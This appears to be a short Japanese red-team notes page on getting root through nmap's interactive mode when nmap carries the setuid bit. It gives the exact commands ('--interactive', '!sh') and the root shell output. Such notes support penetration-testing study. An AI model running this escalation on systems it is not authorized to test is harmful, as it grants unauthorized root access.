---
title: SetUID Nmap
parent: Active Directory
grand_parent: Red Team
---

# Nmapでの対話モードを使用した権限昇格
`nmap`に`setuid`ビットが設定されており、`root`権限で実行可能な場合、対話モードを利用して`root`権限を取得できます。以下はその手順です。
1. `nmap`を対話モードで起動します。
```bash
/usr/local/bin/nmap --interactive
```
2. 対話モードに入ると、以下のメッセージが表示されます。
```plaintext
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
```
3. 対話モードでシェルを起動します。
```plaintext
nmap> !sh
```
4. これで`root`権限のシェルにアクセスできます。`whoami`コマンドで確認します。
```bash
# whoami
root
```